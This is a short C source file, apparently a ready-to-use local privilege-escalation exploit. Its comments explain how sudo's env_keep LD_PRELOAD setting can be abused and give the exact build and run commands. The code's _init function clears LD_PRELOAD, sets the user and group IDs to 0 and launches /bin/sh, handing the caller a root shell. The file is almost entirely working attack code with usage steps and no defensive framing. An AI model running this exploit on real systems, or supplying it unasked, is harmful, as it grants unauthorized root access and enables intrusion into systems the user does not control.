//This file allows for the privelege escalation of the non-protected sudo-er account.
//The envkeep+= LD_PRELOAD default entry allows for shared binaries to be preloaded prior to a sudo command, allowing them to be executed prior to running any sudo command.
// Build this with 
//gcc -fPIC -o privesc.so privesc.c -nostartfiles
//ignore warnings.
//sudo LD_PRELOAD=/DIRECTORYPATH/privesc.so <SUDO BINARY>

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
